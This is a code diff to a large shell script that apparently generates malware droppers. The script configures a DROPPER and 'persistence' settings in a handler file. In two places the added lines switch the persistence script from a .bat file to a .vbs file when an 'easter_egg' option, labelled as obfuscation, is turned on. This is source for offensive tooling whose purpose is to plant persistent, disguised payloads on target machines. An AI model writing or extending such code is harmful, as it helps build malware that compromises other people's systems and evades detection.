@@ -13007,6 +13007,10 @@ if [ "$persistence" = "Add persistence" ]; then
    nove=$(cat handler.sh | egrep -m 1 "DROPPER") > /dev/null 2>&1
    sed -i "s|$nove|DROPPER='$Drop.bat'|" handler.sh
 
+   ## Obfuscation=on (vbs persistence script)
+   if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
+      sed -i "s|.update.bat|.update.vbs|" handler.sh
+   fi
 
    ## Write README file (to be compressed)
    echo "Id          : $Id" > README
@@ -13273,6 +13277,11 @@ if [ "$persistence" = "Add persistence" ]; then
    sed -i "s|$oito|FIRST_ACCESS='$dtr'|" handler.sh
    nove=$(cat handler.sh | egrep -m 1 "DROPPER") > /dev/null 2>&1
    sed -i "s|$nove|DROPPER='$Drop.$ext.bat'|" handler.sh
+
+   ## Obfuscation=on (vbs persistence script)
+   if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
+      sed -i "s|.update.bat|.update.vbs|" handler.sh
+   fi
 
 
    ## Write README file (to be compressed)
